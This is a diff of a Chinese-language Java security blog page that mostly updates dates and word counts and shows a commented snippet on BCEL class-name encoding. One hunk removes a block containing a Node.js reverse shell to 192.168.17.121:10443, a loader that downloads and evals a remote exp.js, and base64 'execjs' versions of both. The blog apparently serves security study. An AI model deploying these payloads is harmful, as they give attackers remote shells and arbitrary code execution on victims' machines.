@@ -477,8 +477,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-08-25 01:05:06</span>
-            <span class="mobile">2025-08-25 01:05:06</span>
+            <span class="desktop">2025-08-27 01:33:19</span>
+            <span class="mobile">2025-08-27 01:33:19</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -526,12 +526,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>52.7k Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>52.6k Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>227 Mins</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>226 Mins</span>
         </span>
     
     
@@ -1443,12 +1443,6 @@
 <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用作转义前缀的特殊字符；凡遇到不可直接写出的字节，先写一个 &#x27;$&#x27; 再写编码内容</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">char</span> <span class="variable">ESCAPE_CHAR</span> <span class="operator">=</span> <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> b)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 情况 A：如果 b 转成的字符本身就是“合法的 Java 标识符组成部分”</span></span><br><span class="line">    <span class="comment">//（例如字母、数字、下划线等），且它本身不是转义前缀 &#x27;$&#x27;，那么可以原样输出。</span></span><br><span class="line">    <span class="comment">// 这样能最大程度保持可读性并缩短结果。</span></span><br><span class="line">    <span class="keyword">if</span> (isJavaIdentifierPart((<span class="type">char</span>) b) &amp;&amp; (b != ESCAPE_CHAR)) &#123;</span><br><span class="line">        out.write(b);  <span class="comment">// 直接写出该字符</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 情况 B：否则进入“转义模式”</span></span><br><span class="line">        <span class="comment">// 先输出转义前缀 &#x27;$&#x27;，表明接下来不是原字符，而是一个被编码后的表示</span></span><br><span class="line">        out.write(ESCAPE_CHAR);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// B-1：快速映射路径</span></span><br><span class="line">        <span class="comment">// 若 b 落在预留的“快速/特殊映射”区间 [0, FREE_CHARS) 内，</span></span><br><span class="line">        <span class="comment">// 则用 CHAR_MAP[b] 映射为“一个安全字符”写出。</span></span><br><span class="line">        <span class="comment">// 这样做的目的：对常见字节值用 1 个字符完成编码，节省长度。</span></span><br><span class="line">        <span class="keyword">if</span> (b &gt;= <span class="number">0</span> &amp;&amp; b &lt; FREE_CHARS) &#123;</span><br><span class="line">            out.write(CHAR_MAP[b]); <span class="comment">// 表驱动的 1 字符转义</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// B-2：通用转义路径（两位十六进制）</span></span><br><span class="line">            <span class="comment">// 对不在快速映射表内的字节，使用两位小写十六进制表示（高位在前）。</span></span><br><span class="line">            <span class="comment">// 注意这里确保总是恰好两位：若只有一位，则在前面补 &#x27;0&#x27;。</span></span><br><span class="line">            <span class="comment">// 这样可以在解码时按“每次读两位十六进制”的固定步长正确还原。</span></span><br><span class="line">            <span class="type">char</span>[] tmp = Integer.toHexString(b).toCharArray();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (tmp.length == <span class="number">1</span>) &#123;      <span class="comment">// 例如十进制 5 -&gt; 十六进制 &quot;5&quot;</span></span><br><span class="line">                out.write(<span class="string">&#x27;0&#x27;</span>);          <span class="comment">// 补成 &quot;05&quot;</span></span><br><span class="line">                out.write(tmp[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;                     <span class="comment">// 正常两位（或更长，见下提示）</span></span><br><span class="line">                out.write(tmp[<span class="number">0</span>]);</span><br><span class="line">                out.write(tmp[<span class="number">1</span>]);       <span class="comment">// 仅写入前两位，保持统一长度为 2</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
 <p>最后我们需要在编码后的字节码前面加上 <code>$$BCEL$$</code> 标识，这样 BCEL ClassLoader 就可以正确识别类的字节码并动态加载类。</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;sh=require(&#x27;child_process&#x27;).spawn(&#x27;/bin/node&#x27;,[&#x27;-i&#x27;]);c=require(&#x27;net&#x27;).Socket();c.connect(10443,&#x27;192.168.17.121&#x27;,function()&#123;c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);&#125;);return;&#125;)();</span><br><span class="line"></span><br><span class="line">execjs &#x27;KGZ1bmN0aW9uKCl7c2g9cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLnNwYXduKCcvYmluL25vZGUnLFsnLWknXSk7Yz1yZXF1aXJlKCduZXQnKS5Tb2NrZXQoKTtjLmNvbm5lY3QoMTA0NDMsJzE5Mi4xNjguMTcuMTIxJyxmdW5jdGlvbigpe2MucGlwZShzaC5zdGRpbik7c2guc3Rkb3V0LnBpcGUoYyk7c2guc3RkZXJyLnBpcGUoYyk7fSk7cmV0dXJuO30pKCk7Cg==&#x27;</span><br><span class="line"></span><br><span class="line">require(&#x27;http&#x27;).get(&#x27;http://192.168.17.121:8000/exp.js&#x27;,res=&gt;&#123;t=&#x27;&#x27;;res.on(&#x27;data&#x27;,c=&gt;&#123;t+=c&#125;);res.on(&#x27;end&#x27;,()=&gt;&#123;eval(t)&#125;);&#125;);</span><br><span class="line"></span><br><span class="line">execjs &#x27;cmVxdWlyZSgnaHR0cCcpLmdldCgnaHR0cDovLzE5Mi4xNjguMTcuMTIxOjgwMDAvZXhwLmpzJyxyZXM9Pnt0PScnO3Jlcy5vbignZGF0YScsYz0+e3QrPWN9KTtyZXMub24oJ2VuZCcsKCk9PntldmFsKHQpfSk7fSk7Cg==&#x27;</span><br><span class="line"></span><br><span class="line">console.log(&#x27;aaaaaaaaaa&#x27;)</span><br><span class="line">execjs &#x27;Y29uc29sZS5sb2coJ2FhYWFhYWFhYWEnKQo=&#x27;</span><br><span class="line">execjs Y29uc29sZS5sb2coJ2FhYWFhYWFhYWEnKQo=</span><br><span class="line"></span><br><span class="line">(function()&#123;return &#x27;aaa&#x27;;&#125;)();</span><br><span class="line"></span><br><span class="line">execjs KGZ1bmN0aW9uKCl7cmV0dXJuICdhYWEnO30pKCk7Cg==</span><br><span class="line"></span><br><span class="line">execjs KGZ1bmN0aW9uKCl7cmV0dXJuICdhYWEnO30pKCk7Cg==</span><br><span class="line">[!] JS error: Code generation from strings disallowed for this context</span><br></pre></td></tr></table></figure></div>
-
-
-
-
-
 <h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><p>Java 反射（Reflection）机制是 Java 提供的一种非常强大的功能，它允许程序在运行时 <strong>动态地获取类的信息</strong>，并能够 <strong>操作类的方法、字段、构造器等成员</strong>。反射机制提供了对类、方法、字段等元数据的访问，而不需要在编译时提前知道这些信息。</p>
 <p>反射机制的核心是 <strong><code>java.lang.reflect</code> 包</strong> 和 <strong><code>java.lang.Class</code> 类</strong>。</p>
 <p>JVM 为每个加载的类创建了对应的 <code>java.lang.Class</code> 实例，并在该实例中保存了类的所有信息。因此，如果我们获取了某个类的 <code>Class</code> 实例，我们就可以通过这个 <code>Class</code> 实例获取到该实例对应  <code>java.lang.reflect</code> 包提供的一系列类的实例。通过获取到的这些实例，我们可以<strong>获取类的信息</strong>（如构造方法、字段、方法等），并能 <strong>操作对象的字段</strong> 或 <strong>调用方法</strong>。<br><img  
@@ -2359,7 +2353,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-08-25 01:05:06
+                    :</strong> 2025-08-27 01:33:19
             </li>
         
         <li>
@@ -2519,7 +2513,7 @@
                     </span>
                     
                         <span>
-                            811.2k words in total
+                            844k words in total
                         </span>
                     
                 </p>
